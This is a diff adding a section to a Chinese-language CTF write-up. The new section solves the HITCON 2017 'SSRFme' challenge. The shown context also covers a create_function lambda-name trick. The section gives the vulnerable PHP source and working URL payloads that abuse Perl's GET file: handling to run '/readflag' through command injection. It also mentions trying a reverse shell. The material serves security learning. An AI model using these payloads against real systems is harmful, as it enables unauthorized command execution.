@@ -125,3 +125,45 @@ show_source(__FILE__);
 
 此题关键点在于create_function，这个函数创建了一个匿名函数，我们想要拿到flag就只有调用$key或者ctfshow_$hash()，如果去碰撞这个hash显然不现实，这里如果打印$key会发现其实它返回``%00lambda_%d``，%d是从1开始逐增的整数，也就是说在最开始的时候``$key=%00lambda_1``，我们每一次访问页面后面的数字都会增加，``%00lambda_2、%00lambda_3``等等，所以这个题只有一次成功机会，在环境刚开时打入payload：``?func_name=%00lambda_1``
 
+## web793
+
+**出处：[HITCON 2017]SSRFme**
+
+```php
+<?php
+    # GET 类似于ls，可以获取目录结构，也可以用于命令执行
+    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
+	# 以数组的形式返回关于文件路径的信息
+    $info = pathinfo($_GET["filename"]); 
+	# $info["dirname"]为目录路径，并且去掉了.
+    $dir  = str_replace(".", "", basename($info["dirname"])); 
+	# 创建目录
+    @mkdir($dir); 
+	# 切换目录
+    @chdir($dir); 
+	# 写文件
+    @file_put_contents(basename($info["basename"]), $data); 
+    highlight_file(__FILE__); 
+```
+
+踩坑点：本地复现时是win环境，GET命令无法执行，卡了我好一会
+
+首先获取根目录下文件结构：``payload：?url=/&filename=test/test.txt``
+
+访问 test/test.txt 得到
+
+![image-20220228185333753](image/ctfshow 大赛原题 （680-XX）/image-20220228185333753.png)
+
+有个flag和readflag，flag并不能直接读，所以是通过readflag去读flag内容
+
+**tips：file伪协议在使用的时候会执行perl中的open函数，open存在命令执行，前提条件是必须存在以 即将执行的命令 命名的文件夹，才会触发。**
+
+第一步创建同名文件：?url=&filename=bash -c /readflag|
+
+第二步命令执行：?url=file:bash -c /readflag|&filename=/test/test.txt
+
+**别忘了管道符**
+
+![image-20220228191605272](image/ctfshow 大赛原题 （680-XX）/image-20220228191605272.png)
+
+此外也可以弹shell，但是perl下弹shell我一直失败，如有成功的师傅烦请滴滴我让我膜一下Orz
